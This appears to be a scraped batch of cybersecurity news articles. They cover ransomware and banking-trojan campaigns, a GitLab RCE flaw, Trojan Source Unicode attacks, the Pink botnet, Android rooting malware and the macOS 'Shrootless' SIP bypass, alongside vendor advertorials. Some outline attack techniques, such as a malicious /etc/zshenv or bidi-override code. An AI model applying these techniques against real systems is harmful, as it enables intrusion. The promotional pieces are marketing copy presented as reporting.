kill specific processes, including the firewall, prior to commencing data encryption. \nThe findings come as VX-Underground, a portal that hosts malware source code, samples and papers, revealed that the group is pulling the plug on its operations “following pressure from local authorities.“ The post shared on the RaaS website also noted that a “part of the team is no longer available, after the latest news.“\n\nIt’s not immediately clear what the “latest news“ could be referring to, but it implies a strong link to the coordinated international law enforcement operation late last month that saw 12 individuals arrested for orchestrating ransomware attacks against 1,800 victims across 71 countries since 2019.\nIn an advisory issued on October 18, 2021, the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the National Security Agency (NSA) warned that the BlackMatter ransomware group has targeted “multiple“ organizations deemed critical infrastructure, including two entities in the U.S. food and agriculture sector.\nThen last week, New Zealand cybersecurity company Emsisoft disclosed it had discovered a flaw in the BlackMatter ransomware earlier this year that enabled encrypted files to be recovered without paying a ransom to the cybercriminals. To add to the pressure on ransomware operators, the Washington Post reported the U.S. Cyber Command, in partnership with a foreign government, hacked into servers maintained by the REvil ransomware group, forcing it to close shop a second time.\n“[The shutdown of the program] doesn’t mean that BlackMatter’s affiliates will stop malicious activity,“ Group-IB said. “They will most likely join other RaaS programs. In addition, this might just be an attempt to have a fresh start under a different name. Just like BlackMatter was a rebranding of DarkSide, a new successor may appear soon.“\n\n\nFound this article interesting?

{'title': 'Product Overview - Cynet Centralized Log Management',
'text': 'For most organizations today, the logs produced by their security tools and environments provide a mixed bag. On the one hand, they can be a trove of valuable data on security breaches, vulnerabilities, attack patterns, and general security insights.\nOn the other, organizations don’t have the right means to manage the massive scale of logs and data produced to derive any value from it. \nLog management can quickly become a sore point, and either be forgotten or improperly managed if done manually.\nIn turn, this reduces data transparency and leaves organizations more exposed to vulnerabilities that could have been detected. A new centralized log management module (CLM) introduced by XDR provider Cynet (learn more here) could help organizations lighten that load and enhance organizations’ visibility into their valuable log data. \nInstead of manually handling the collection, storage, and parsing of data, organizations can use CLM to enhance their log analysis, better understand their security environment, and lighten the load on lean security teams that must handle this process. \n\nIntroducing Cynet CLM\nCynet’s new Centralized Log Management module offers organizations an effective way to deal with the massive volume of security logs most organizations – regardless of size – generate. The first step to doing this is to automate the process. \nCynet CLM automatically collects the highest priority log data to uncover threats quickly and accurately across an organization’s environment. Event logs and data are collected from network devices and applications, SaaS applications, and any hosts connected to the Cynet platform. Logs are stored in a data lake which can be accessed directly through the Cynet console. \nVisual log analysis \nOne common issue with the high volume of logs is organizing them into a format that is easily digestible and understandable. Cynet offers a visual analysis tool that lets security teams create charts and dashboards that let them gather and leverage insights from their log repository. Moreover, it lets teams quickly pinpoint and resolve issues. \n\nCentralized control \nAs the name implies, Cynet’s CLM gives organizations an easy way to view, sort, query, filter and correlate data from hundreds of sources in a single location. Instead of having to hunt threats and look for vulnerabilities across a network of sources, security teams can simply focus on a single pane of glass that lets them organize their data and leverage powerful query tools to find exactly the information they need.\n\nEasier data deep-dives\nPerhaps the biggest advantage of centralizing log management is the depth of analysis a single data point can offer. Cynet CLM automatically connects all data points connected to log events into single threads.\nThis makes it easier to understand an event across an entire network in a single view. Security teams don’t have to manually scour through hundreds of logs and sources to track a single event. Instead, a single click lets teams quickly understand an event and find ways to resolve it and prevent it in the future. \n\nOrganizations can now add Cynet CLM to their existing Cynet 360 licenses and add a new log analysis tool to their arsenal. \nCynet is also launching a webinar to introduce its CLM module. You can register here.\nYou can learn more about Cynet CLM here. \n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'The operators behind the Mekotio banking trojan have resurfaced with a shift in its infection flow so as to stay under the radar and evade security software, while staging nearly 100 attacks over the last three months.\n“One of the main characteristics […] is the modular attack which gives the attackers the ability to change only a small part of the whole in order to avoid detection,“ researchers from Check Point Research said in a report shared with The Hacker News. The latest wave of attacks are said to primarily target victims located in Brazil, Chile, Mexico, Peru, and Spain.\nThe development comes after Spanish law enforcement agencies in July 2021 arrested 16 individuals belonging to a criminal network in connection with operating Mekotio and another banking malware called Grandoreiro as part of a social engineering campaign targeting financial institutions in Europe.\n\nThe evolved version of the Mekotio malware strain is designed for compromising Windows systems with an attack chain that commences with phishing emails masquerading as pending tax receipts and containing a link to a ZIP file or a ZIP file as an attachment. Clicking open the ZIP archive triggers the execution of a batch script that, in turn, runs a PowerShell script to download a second-stage ZIP file.\n\nThis secondary ZIP file houses three different files — an AutoHotkey (AHK) interpreter, an AHK script, and the Mekotio DLL payload. The aforementioned PowerShell script then calls the AHK interpreter to execute the AHK script, which runs the DLL payload to steal passwords from online banking portals and exfiltrate the results back to a remote server.\nThe malicious modules are characterized by the use of simple obfuscation techniques, such as substitution ciphers, giving the malware improved stealth capabilities and enabling it to go undetected by most antivirus solutions.\n\n“There’s a very real danger in the Mekotio banker stealing usernames and passwords, in order to gain entry into financial institutions,“ Check Point’s Kobi Eisenkraft said. “Hence, the arrests stopped the activity of the Spanish gangs, but not the main cybercrime groups behind Mekotio.“\nUsers in Latin America are highly recommended to use two-factor authentication to secure their accounts from takeover attacks, and watch out for lookalike domains, spelling errors in emails or websites, and email messages from unfamiliar senders.\n\n\nFound this article interesting?

Furthermore, the company’s Automatic Alt Text (AAT) tool, which creates image descriptions for visually impaired people, will no longer include the names of people identified in photos.\n\nFacebook’s discontinuing of the program comes in the wake of sustained privacy and ethical concerns raised by the use of facial recognition that it could be abused to target marginalized communities, further racial bias, and normalize intrusive surveillance, leading to government bans across a number of cities in the U.S. such as Boston, San Francisco, New Orleans, and Minneapolis, among others. In May 2021, Amazon announced it would indefinitely extend a moratorium on law enforcement’s use of its facial recognition systems.\nThe company said it’s making the change because of a need to “weigh the positive use cases for facial recognition against growing societal concerns, especially as regulators have yet to provide clear rules.“ That said, Meta said it will maintain the use of face recognition in “services that help people gain access to a locked account, verify their identity in financial products or unlock a personal device,“ nor does it rule out incorporating biometrics into its emerging metaverse business.\nMeta is also expected to retain DeepFace, the sophisticated algorithm that powers its photo-tagging facial recognition system, the company told the New York Times.\nFacebook introduced facial recognition in 2010 as a means to automatically tag photos and videos with names based on a “face recognition template“ it generates from users’ profile pictures as well as photos and videos that they have been already tagged in, alongside notifying users when they appear in multimedia content posted by other users and providing recommendations for whom to tag in the photos.\nAlthough enabled by default at launch, the feature was scaled back and made an explicit opt-in in September 2019, following which more than a third of Facebook’s daily active users — about 640 million people — are said to have opted to turn on the setting.\n\nIf anything, Meta’s decision to move away from facial recognition appears to be a step designed to pre-empt any regulatory scrutiny following years of legal woes, including a lawsuit in the U.S. state of Illinois that took the company to court for violating the Biometric Information Privacy Act (BIPA) and using the tech to identify Illinois residents photos without their consent. The company, earlier this March, was ordered to pay $650 million to settle the class-action suit.\nThe development also arrives as Facebook attempts to rebrand and distance itself from a wide range of controversies that have plagued its products in recent years, what with the company recently coming under the lens for allegedly prioritizing engagement and profits over users’ safety and real-world harms exacerbated by its platforms.\n“This is great news for Facebook users, and for the global movement pushing back on this technology,“ the Electronic Frontier Foundation said in a tweet.\n\n\nFound this article interesting?

'text': 'A now-patched critical remote code execution (RCE) vulnerability in GitLab’s web interface has been detected as actively exploited in the wild, cybersecurity researchers warn, rendering a large number of internet-facing GitLab instances susceptible to attacks.\nTracked as CVE-2021-22205, the issue relates to an improper validation of user-provided images that results in arbitrary code execution. The vulnerability, which affects all versions starting from 11.9, has since been addressed by GitLab on April 14, 2021 in versions 13.8.8, 13.9.6, and 13.10.3.\n\nIn one of the real-world attacks detailed by HN Security last month, two user accounts with admin privileges were registered on a publicly-accessible GitLab server belonging to an unnamed customer by exploiting the aforementioned flaw to upload a malicious payload “image,“ leading to remote execution of commands that granted the rogue accounts elevated permissions.\nAttacks exploiting the vulnerability are said to have begun as early as June this year, coinciding with the public availability of proof-of-concept (PoC) code required to breach the servers.\n\nAlthough the flaw was initially deemed to be a case of authenticated RCE and assigned a CVSS score of 9.9, the severity rating was revised to 10.0 on September 21, 2021 owing to the fact that it can be triggered by unauthenticated threat actors as well.\n“Despite the tiny move in CVSS score, a change from authenticated to unauthenticated has big implications for defenders,“ cybersecurity firm Rapid7 said in an alert published Monday.\n\nTelemetry data gathered by the Boston-based company show that of the 60,000 internet-facing GitLab installations, only 21% of the instances are fully patched against the issue, with another 50% still vulnerable to RCE attacks regardless of the fact that the patches have been up for grabs for more than six months.\nIn the light of the unauthenticated nature of this vulnerability, exploitation activity is expected to increase, making it critical that GitLab users update to the latest version as soon as possible. “In addition, ideally, GitLab should not be an internet facing service,“ the researchers said. “If you need to access your GitLab from the internet, consider placing it behind a VPN.“\nAdditional technical analysis related to the vulnerability can be accessed here.\nUpdate: Threat actors are now actively exploiting the security flaw to co-opt unpatched GitLab servers into a botnet and launch distributed denial of service (DDoS) attacks, with some in excess of 1 terabits per second (Tbps), according to Google security reliability engineer Damian Menscher.\n\n\nFound this article interesting?

{'title': 'Securing SaaS Apps — CASB vs. SSPM',
'text': 'There is often confusion between Cloud Access Security Brokers (CASB) and SaaS Security Posture Management (SSPM) solutions, as both are designed to address security issues within SaaS applications. CASBs protect sensitive data by implementing multiple security policy enforcements to safeguard critical data. For identifying and classifying sensitive information, like Personally Identifiable Information (PII), Intellectual Property (IP), and business records, CASBs definitely help. \nHowever, as the number of SaaS apps increase, the amount of misconfigurations and possible exposure widens and cannot be mitigated by CASBs. These solutions act as a link between users and cloud service providers and can identify issues across various cloud environments. Where CASBs fall short is that they identify breaches after they happen.\nWhen it comes to getting full visibility and control over the organization’s SaaS apps, an SSPM solution would be the better choice, as the security team can easily onboard apps and get value in minutes — from the immediate configuration assessment to its ongoing and continuous monitoring. By fixing these configuration weaknesses and misconfigurations in the SaaS stack, the security team is actually preventing a leak or breach. \n➤ How to ensure your company’s SaaS security\nTo fully understand why SSPM is the ideal solution for today’s SaaS environment, it’s best to take a look at the challenges that accompany these deployments. \nToday eighty-five percent of InfoSecurity professionals cite SaaS misconfigurations as one of the top three risks facing today’s organizations. The challenge stems from what we like to call the three V’s of SaaS Security:\nVolume: With an increasing number of apps to manage, configure, and update – each with its own security settings – security teams need to ensure each app is compliant with the company’s policies. With hundreds of app setups and tens of thousands of user roles and privileges, this quickly becomes an impossible and unsustainable scenario. According to our2021 SaaS Security Survey Report only 12% of companies said they are able to check for SaaS misconfigurations weekly.Velocity: The SaaS environment is dynamic and continually changing. As employees are added or removed and new apps are onboarded, security teams must continuously ensure that all configurations are enforced company-wide. The dynamic nature of the security environment adds even more pressure to already overwhelmed security teams.Visibility: Most SaaS apps are purchased by and implemented in the departments that utilize them most. This leaves security teams in the dark, unaware of the app owner’s usage behavior and whether or not they stay on top of potential risks. Employees with admin access or privileges can leave a company exposed, as they are untrained in security matters and more focused on their productivity, making it crucial for SaaS apps to be configured correctly and regularly monitored by the organization’s security team. \nSaaS app providers build in robust security features that are designed to protect company and user data, yet whether the features are implemented correctly are another matter. \nThe configurations and enforcement fall under the responsibility of the organization utilizing the app. \nA SaaS Security Posture Management solution, like Adaptive Shield, is critical to the security of today’s enterprise. Gartner predicts SSPM will increase its impact over the next five to ten years. With its ability to effectively manage this chaotic SaaS environment, SSPM can continuously assess and manage the security risk and posture of SaaS apps and prevent configuration errors and advanced attacks. While CASBs do address an organization’s security gaps at the SaaS layer, they are, as mentioned earlier, primarily reactive, focusing on the detection of breaches once they have occurred. \nWhen it comes to preventing misconfigurations, proactive identification is key, making SSPM the best option to ensure a secure and safe SaaS environment.\n➤ Learn more about how to ensure your company’s SaaS security\n\n\nFound this article interesting?

{'title': 'New ’Trojan Source’ Technique Lets Hackers Hide Vulnerabilities in Source Code',
'text': 'A novel class of vulnerabilities could be leveraged by threat actors to inject visually deceptive malware in a way that’s semantically permissible but alters the logic defined by the source code, effectively opening the door to more first-party and supply chain risks.\nDubbed “Trojan Source attacks,“ the technique “exploits subtleties in text-encoding standards such as Unicode to produce source code whose tokens are logically encoded in a different order from the one in which they are displayed, leading to vulnerabilities that cannot be perceived directly by human code reviewers,“ Cambridge University researchers Nicholas Boucher and Ross Anderson said in a newly published paper.\n\nThe vulnerabilities — tracked as CVE-2021-42574 and CVE-2021-42694 — affect compilers of all popular programming languages such as C, C++, C#, JavaScript, Java, Rust, Go, and Python.\nCompilers are programs that translate high-level human-readable source code into their lower-level representations such as assembly language, object code, or machine code that can then be executed by the operating system.\nAt its core, the issue concerns Unicode’s bidirectional (or Bidi) algorithm which enables support for both left-to-right (e.g., English) and right-to-left (e.g., Arabic or Hebrew) languages, and also features what’s called bidirectional overrides to allow writing left-to-right words inside a right-to-left sentence, or vice versa, thereby making it possible to embed text of a different reading direction inside large blocks of text.\nWhile a compiler’s output is expected to correctly implement the source code supplied to it, discrepancies created by inserting Unicode Bidi override characters into comments and strings can enable a scenario that yields syntactically-valid source code in which the display order of characters presents logic that diverges from the actual logic.\nPut differently, the attack works by targeting the encoding of source code files to craft targeted vulnerabilities, rather than deliberately introducing logical bugs, so as to visually reorder tokens in source code that, while rendered in a perfectly acceptable manner, tricks the compiler into processing the code in a different way and drastically changing the program flow — e.g., making a comment appear as if it were code.\n\n“In effect, we anagram program A into program B,“ the researchers surmised. “If the change in logic is subtle enough to go undetected in subsequent testing, an adversary could introduce targeted vulnerabilities without being detected.“\nSuch adversarial encodings can have a serious impact on the supply chain, the researchers warn, when invisible software vulnerabilities injected into open-source software make their way downstream, potentially affecting all users of the software. Even worse, the Trojan Source attacks can become more severe should an attacker use homoglyphs to redefine pre-existing functions in an upstream package and invoke them from a victim program.\nBy replacing Latin letters with lookalike characters from other Unicode family sets (e.g., changing “H“ to Cyrillic “Н“), a threat actor can create a homoglyph function that seemingly looks similar to the original function but actually contains malicious code that could then be added to an open-source project without attracting much scrutiny. An attack of this kind could be disastrous when applied against a common function that’s available via an imported dependency or library, the paper noted.\n“The fact that the Trojan Source vulnerability affects almost all computer languages makes it a rare opportunity for a system-wide and ecologically valid cross-platform and cross-vendor comparison of responses,“ the researchers noted. “As powerful supply-chain attacks can be launched easily using these techniques, it is essential for organizations that participate in a software supply chain to implement defenses.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers disclosed details of what they say is the “largest botnet“ observed in the wild in the last six years, infecting over 1.6 million devices primarily located in China, with the goal of launching distributed denial-of-service (DDoS) attacks and inserting advertisements into HTTP websites visited by unsuspecting users.\nQihoo 360’s Netlab security team dubbed the botnet “Pink“ based on a sample obtained on November 21, 2019, owing to a large number of function names starting with “pink.“\n\nMainly targeting MIPS-based fiber routers, the botnet leverages a combination of third-party services such as GitHub, peer-to-peer (P2P) networks, and central command-and-control (C2) servers for its bots to controller communications, not to mention completely encrypting the transmission channels to prevent the victimized devices from being taken over.\n“Pink raced with the vendor to retain control over the infected devices, while vendor made repeated attempts to fix the problem, the bot master noticed the vendor’s action also in real time, and made multiple firmware updates on the fiber routers correspondingly,“ the researchers said in an analysis published last week following coordinated action taken by the unspecified vendor and China’s Computer Network Emergency Response Technical Team/Coordination Center (CNCERT/CC).\n\nInterestingly, Pink has also been found adopting DNS-Over-HTTPS (DoH), a protocol used for performing remote Domain Name System resolution via the HTTPS protocol, to connect to the controller specified in a configuration file that’s either delivered either via GitHub or Baidu Tieba, or via a built-in domain name hard-coded into some of the samples.\n\nMore than 96% of the zombie nodes part of the “super-large-scale bot network“ were located in China, Beijing-based cybersecurity company NSFOCUS noted in an independent report, with the threat actor breaking into the devices to install malicious programs by taking advantage of zero-day vulnerabilities in the network gateway devices. Although a significant chunk of the infected devices has since been repaired and restored to their previous state as of July 2020, the botnet is still said to be active, comprising about 100,000 nodes.\nWith nearly 100 DDoS attacks having been launched by the botnet to date, the findings are yet another indication as to how botnets can offer a powerful infrastructure for bad actors to mount a variety of intrusions. “Internet of Things devices have become an important goal for black production organizations and even advanced persistent threats (APT) organizations,“ NSFOCUS researchers said. “Although Pink is the largest botnet ever discovered, it will never be the last one.“\n\n\nFound this article interesting?

'text': 'An unidentified threat actor has been linked to a new Android malware strain that features the ability to root smartphones and take complete control over infected smartphones while simultaneously taking steps to evade detection.\nThe malware has been named “AbstractEmu“ owing to its use of code abstraction and anti-emulation checks undertaken to thwart analysis right from the moment the apps are opened. Notably, the global mobile campaign is engineered to target and infect as many devices as possible indiscriminately.\n\nLookout Threat Labs said it found a total of 19 Android applications that posed as utility apps and system tools like password managers, money managers, app launchers, and data saving apps, seven of which contained the rooting functionality. Only one of the rogue apps, called Lite Launcher, made its way to the official Google Play Store, attracting a total of 10,000 downloads before it was purged.\nThe apps are said to have been prominently distributed via third-party stores such as the Amazon Appstore and the Samsung Galaxy Store, as well as other lesser-known marketplaces like Aptoide and APKPure.\n\n“While rare, rooting malware is very dangerous. By using the rooting process to gain privileged access to the Android operating system, the threat actor can silently grant themselves dangerous permissions or install additional malware — steps that would normally require user interaction,“ Lookout researchers said. “Elevated privileges also give the malware access to other apps’ sensitive data, something not possible under normal circumstances.“\nOnce installed, the attack chain is designed to leverage one of five exploits for older Android security flaws that would allow it to gain root permissions and take over the device, extract sensitive data, and transmit to a remote attack-controlled server —\nCVE-2015-3636 (PongPongRoot)CVE-2015-1805 (iovyroot)CVE-2019-2215 (Qu1ckr00t)CVE-2020-0041, andCVE-2020-0069\n\nLookout attributed the mass distributed rooting malware campaign to a “well-resourced group with financial motivation,“ with telemetry data revealing that Android device users in the U.S. were the most impacted.

'text': 'Microsoft on Thursday disclosed details of a new vulnerability that could allow an attacker to bypass security restrictions in macOS and take complete control of the device to perform arbitrary operations on the device without getting flagged by traditional security solutions.\nDubbed “Shrootless“ and tracked as CVE-2021-30892, the “vulnerability lies in how Apple-signed packages with post-install scripts are installed,“ Microsoft 365 Defender Research Team’s Jonathan Bar Or said in a technical write-up. “A malicious actor could create a specially crafted file that would hijack the installation process.“\n\nSystem Integrity Protection (SIP) aka “rootless“ is a security feature introduced in OS X El Capitan that’s designed to protect the macOS operating system by restricting a root user from executing unauthorized code or performing operations that may compromise system integrity.\nSpecifically, SIP allows modification of protected parts of the system — such as /System, /usr, /bin, /sbin, and /var — only by processes that are signed by Apple or those that have special entitlements to write to system files, like Apple software updates and Apple installers, while also automatically authorizing apps that are downloaded from the Mac App Store.\n\nMicrosoft’s investigation into the security technology looked at macOS processes entitled to bypass SIP protections, leading to the discovery of a software installation daemon called “system_installd“ that enables any of its child processes to completely circumvent SIP filesystem restrictions.\nThus when an Apple-signed package is being installed, it invokes the system_installd daemon, which, in turn, executes any post-install scripts contained in the package by invoking a default shell, which is Z shell (zsh) on macOS.\n\n“Interestingly, when zsh starts, it looks for the file /etc/zshenv, and — if found — runs commands from that file automatically, even in non-interactive mode,“ Bar Or said. “Therefore, for attackers to perform arbitrary operations on the device, a fully reliable path they could take would be to create a malicious /etc/zshenv file and then wait for system_installd to invoke zsh.“\nSuccessful exploitation of CVE-2021-30892 could enable a malicious application to modify protected parts of the file system, including the capability to install malicious kernel drivers (aka rootkits), overwrite system files, or install persistent, undetectable malware. Apple said it remediated the problem with additional restrictions as part of security updates pushed on October 26, 2021.\n“Security technology like SIP in macOS devices serves both as the device’s built-in baseline protection and the last line of defense against malware and other cybersecurity threats,“ Bar Or said. “Unfortunately, malicious actors continue to find innovative ways of breaching these barriers for these very same reasons.“\n\n\nFound this article interesting?

'text': 'Winter is Coming for CentOS 8—but here is how you can enjoy your holidays after all.\nThe server environment is complex and if you’re managing thousands of Linux servers, the last thing you want is for an operating system vendor to do something completely unexpected.\nThat is exactly what Red Hat, the parent company of the CentOS Project, did when it suddenly announced a curtailment of support for CentOS 8 – sending thousands of organizations scrambling for an alternative.\nIn this article, we’ll review what happened with CentOS 8 and what it means for users who have already upgraded from CentOS release 7 to release 8. We’ll also look at your alternatives for replacing CentOS 8.\nFinally, we’ll do a review of your other option: choosing extended support. Extended lifecycle support (ELS) can reduce the pressure to decide on alternative distribution and it may well be the most practical route for many CentOS 8 users.\nOfficial support is critical\nThe difficulties around CentOS 8 involve the sudden withdrawal of official support. Official support window timeframes matter because it gives Linux users certainty that they will continue to receive bug fixes as well as patches for CVEs and security vulnerabilities that emerge.\nA fixed end date for support gives users the ability to plan – either upgrading ahead of the end date, or migrating workloads to an alternative if upgrading isn’t a viable option.\nWhile this is an important consideration for people who run a single CentOS instance and for small teams, official support windows become critical for those who depend on CentOS to support large-scale workloads involving big server fleets.\nA single user or small team can quickly shift distributions, but planning for any changes that involve thousands of machines is a whole different story.\nA free Linux distribution – with rock-solid official support\nCentOS had its origins in 2002. The project, a 1:1 fork of Red Hat Enterprise Linux, went through various changes over time. In 2014, Red Hat announced that it would officially sponsor the CentOS project – but in doing so, Red Hat took full control of CentOS, including intellectual assets, and the governing board.\nRed Hat invested a lot of effort into the CentOS project, and CentOS enjoyed a fixed release schedule with equally fixed, reliable support windows. As of late, the CentOS project was quoting 10-year maintenance support windows which was fantastic news for enterprise users who could adopt new releases at a pace that suited them, with long time frames for planning and testing.\nAnd, of course, CentOS is entirely free – saving companies thousands in licensing fees. For example, when CentOS 7 was released in 2014, users were told that they will continue to enjoy support through June 2024. With CentOS 8 coming out in September 2019, it gave enterprise users a long time frame to test and switch to CentOS 8.\nSome CentOS 6 and CentOS 7 users moved quickly and adopted CentOS 8, but these users were in for a surprise.\nWhat changed with CentOS 8?\nWhen CentOS 8 was released, the CentOS project (and by that we really mean Red Hat) promised that it would continue to support CentOS 8 for about ten years officially – just like it did for CentOS 7. The original end of life date for CentOS 8 was May 31, 2029.\nThat’s an excellent support window for a free-to-use, enterprise-grade Linux OS which is also 1:1 binary compatible with RHEL. It meant that enterprise users could essentially avoid paying RHEL license fees, while still working with a trusted distribution.\nUnfortunately, the good news ended rather suddenly in December 2020 when Red Hat unexpectedly announced that it will no longer release CentOS as a stable release at regular intervals, instead focusing on CentOS Stream – a rolling release model, which is delivered differently and whose suitability for enterprise application is still unknown.\nProducts come and go and a change of direction can be somewhat understandable, but the real sting in the announcement was that official support for CentOS 8 will be curtailed by almost eight years – with end-of-life now on Dec 31, 2021 rather than the originally promised May 31, 2029.\nAfter that date, the CentOS Project will no longer publish updates for CentOS 8. Bugs won’t be fixed but, more critically, new vulnerabilities won’t receive patches. In other words, if a major flaw in – for example – the Linux kernel emerges, you simply won’t get an automatic patch for CentOS 8.\nThat is in contrast to what organizations were originally promised for CentOS 8 – a matching patch within 72 hours of the patch being released for RHEL 8, right through the middle of 2029. It creates an enormous headache for tech teams that must now act fast to replace CentOS 8.\nWhy doing nothing isn’t an option\nYou might think that your workloads are running just fine, and that there’s no need to update your CentOS 8 instances to apply bug fixes. Or, that you can simply apply internally coded patches or other remediation measures should a threat arise.\nIn reality, the risks of running an unsupported OS are significant. You can use this calculator to estimate the costs and get a rough figure for your particular infrastructure. We’ve published an in-depth article here, but let’s do a quick recap of the potential problems you face when your OS is no longer enjoying official maintenance support.\nBreaking compatibility and reliability. An OS is surrounded by other software components and if you fail to update your OS with bug fixes, you may find that updates to other components break compatibility -- you end up with updated software and services, but an OS that was never updated with the feature change.\nSecurity risks. This is the big one: if you don’t receive regular updates to your OS you will rapidly accumulate a growing number of security holes in your workload as more and more vulnerabilities get published in public – but never fixed on your systems. All it takes is one entry point for a hacker to gain entry and potential catastrophe to occur.\nCompliance problems. Compliance requirements such as PCI require that systems are patched against vulnerabilities within a specific time frame. When your OS is unsupported you are at risk of breaching compliance requirements which can lead to stiff penalties, the loss of customers – or indeed losing the right to do business altogether.\nThat’s just a brief insight into the potential problems of running CentOS 8 past the end of this year. It’s an enormous risk which is no wonder that companies are rushing to try and come up with alternatives.\nThe problem with CentOS stream\nRed Hat isn’t discontinuing the CentOS Project altogether – CentOS will continue to exist in the form of CentOS Stream, which will always be one step ahead of the latest RHEL release. While Red Hat is suggesting that CentOS Stream is a drop-in replacement, that’s only true for a limited number of use cases.\nMany Linux OS use cases – particularly in the enterprise environment – depend on stable releases: fixed functionality that can be tested, and the assurance that nothing of substance will change until the next release. Indeed, Red Hat’s own CTO has said that CentOS Stream is not a replacement for CentOS 8.\nThe move to the new CentOS Stream may affect the release stability. It will no longer have exactly the same package versions as RHEL - in fact, packages will land in CentOS Stream before making it into a fixed RHEL release. Binary compatibility may suffer, and some organizations’ workloads cannot easily accommodate this.\nCentOS Stream would be a perfectly acceptable replacement for some users – some scientific teams, for example. However, most large-scale user cases involving more than a handful of machines will need to examine alternative operating systems – or alternative support options. And there’s not much time left given CentOS 8 is end-of-life in just a few months.\nHow about downgrading to CentOS 7?\nIn one of the few cases where leaving things to the last minute has paid off, CentOS 7 users are continuing to enjoy the support window the Red Hat originally committed to – with CentOS 7 maintenance support set to last until June 30, 2024. That’s a rather useful two and a half years beyond CentOS 8 support.\nSo how about going back to CentOS 7 as a temporary measure? There is, unfortunately, no supported downgrade path back to CentOS 7. Yes, some unsupported solutions are out there, but you’re at risk of ending up with a system that is in some type of Frankenstein state – containing elements of both releases. You’re almost certain to experience problems further down the line.\nTaking a look at binary compatible alternatives\nWe will divide your alternatives to CentOS 8 into two categories: distributions that are binary compatible with CentOS 8 (and by consequence RHEL 8), and distributions that are relatively close in purpose – but that will require more work to adopt. We’re taking this approach because so many organizations relied on the 1:1 binary compatibility between CentOS 8 and RHEL.\nChoosing a distribution that is binary compatible with CentOS 8 implies that your team has relatively minimal work in terms of switching distributions. In fact, you may be able to switch from CentOS 8 to an alternative distribution just by running a script – but, tech teams will still need to double-check that nothing is broken in the transition. These are your binary compatible options:\nRed Hat Enterprise Linux (RHEL)\nWe mention RHEL first because, by definition, RHEL 8 is 1:1 binary compatible with CentOS 8. Yes, ordinarily, there is a licensing fee associated with RHEL, but due to the backlash against Red Hat’s decisions around CentOS, Red Hat decided to extend the free version of RHEL.\nRed Hat has expanded the free of charge Individual Developer subscription program to now include workloads that involve up to 16 systems. So, if your workloads involve 16 or fewer CentOS instances and if you’re certain you won’t require a larger number of machines, RHEL could be a good choice involving minimal disruption.\nMost enterprise CentOS deployments have far more than 16 active instances and these workloads will incur a licensing fee.\nOracle Linux\nEnterprise users might naturally look towards another free enterprise alternative – Oracle’s 1:1 binary compatible fork of RHEL, called Oracle Linux. Oracle claims that Oracle Linux is fully compatible with CentOS, and anyone who already uses Oracle products will find the tight integration with Oracle’s other products helpful.\nWhile Oracle Linux has a proven track record in the enterprise space, there are some issues around the direction of other products under the Oracle aegis, like Java, that have come up during the years, and, arguably, instilled some reluctance when going with the brand.\nAlmaLinux\nAlmaLinux OS is a 1:1 binary compatible fork of RHEL – and therefore binary compatible with CentOS. AlmaLinux is under the purview of a 501(c)(6) non-profit foundation with a Board of Directors composed of people from around the industry and the community, and community adoption has grown steadily over the months. It already supports most hardware platforms supported by CentOS, is present on the largest cloud provider’s offers and has matched all the announced releases dates along the way.\nThere has been some competition between AlmaLinux OS and Rocky Linux, which was to be expected since both target the same audience.\nThat said, AlmaLinux was faster out of the gate with a production first release than Rocky Linux and the community reception has been positive. AlmaLinux has also recently become available as an OS install on Microsoft’s Azure and offer a set of RHEL UBI equivalent containers as well.\nRocky Linux\nThe early CentOS project merged with a project called CAOS Linux, founded by Gregory Kurtzer in 2002.. After limited involvement, Kurtzer moved on from CentOS to other projects and was needless to say unhappy about Red Hat’s announcement and the changing future of CentOS, so rapidly acted to create a new, binary compatible fork of RHEL – and called it Rocky Linux. \nRocky Linux is binary compatible with CentOS so it is easy to switch to. The open source project is, however, currently under Kurtzer’s full ownership and control although he has made statements about opening that up to others. So, again, there can be concerns that there might be a change of course with Rocky Linux – much the same as Red Hat did with CentOS.\nOther binary compatible alternatives\nCentOS users can also look at ClearOS and Springdale Linux, but in both cases the supporting communities are relatively small. Springdale Linux is backed by serious institutions though – with both the Institute for Advanced Study and Princeton University backing it. While ClearOS has links with HP Enterprise, ClearOS 8 has not yet been released which casts a shadow over the project.\nScientific Linux isn’t an option as the backers, Fermilab, had said they won’t release another version beyond release 7 – so there’s no alternative for CentOS 8 here. For some users, Amazon Linux could be worth investigating – it’s backed by the tech giant and is a CentOS-based clone of RHEL, but you can only run it on Amazon Web Services. \nNon binary-compatible distributions to consider\nYou may well decide that RHEL and its related distributions do not offer any unique features – aside from the original advantage that CentOS is a free RHEL clone. Depending on your workload, migration may be relatively effortless – but you’d nonetheless need to prepare and test to a far greater degree compared to migrating to binary compatible distribution.\nOne of the most obvious alternatives is also one of the most established – Canonical’s Ubuntu. It is, of course, derived from Debian – which means it is some distance away from RHEL and therefore shifting from CentOS to Ubuntu will be a fairly big operation.\nIt all depends on how much of your code is specific to CentOS and whether you rely on vendors for software or write your own code internally. Either way, Ubuntu has the necessary track record and it may well be a sensible option.\nThere are plenty of other, trusted distributions you could think about. OpenSUSE, for example, is offered free for use by SUSE Linux and has a solid reputation, it’s been around for more than 15 years. You could also opt for Debian. However, switching to a new Linux distribution can be more complicated than it sounds. Some points you need to watch out for include:\nMonitoring and management systems need to change because the OS that supports your workload has changed significantly.Development efforts required – both to adjust everyday scripts, and to change the code in the applications that run on your operating system.Coping with different package management mechanisms – RPM on CentOS, RHEL and related distributions, PKG on Debian and Ubuntu.Time consumed and risk associated with the migration process, which comes down to a complete system re-install given the difference between, say, RHEL-based and Debian-based distributions.\nIn other words, choosing a distribution that’s not in the RHEL family may involve significantly more work than you intended and it’s not a decision to be made lightly. \nConsider extended support to buy time\nAt the start of this article we promised you an alternative route that mitigates the urgency created by Red Hat’s decision. It’s a simple concept: relying on a third-party to extend maintenance support for CentOS 8.\nA good extended support service will cover you for essential bug fixes and any emerging vulnerabilities. In other words, if a new threat emerges that affects CentOS 8 your extended support provider will roll out a patch to counter the threat.\nThat means that you remain secure – given that new threats are always patched – and compliant, given that your workloads do not accumulate vulnerabilities over time. By consequence, you can carry on running CentOS 8, buying yourself more time to switch to a new distribution.\nTuxCare’s Extended Lifecycle Support (ELS) for CentOS 8 essentially continues the RHEL support commitment. In fact, ELS from TuxCare improves on what RHEL promised for CentOS – with patches rolled out within two working days instead of three. TuxCare also has the know-how and the 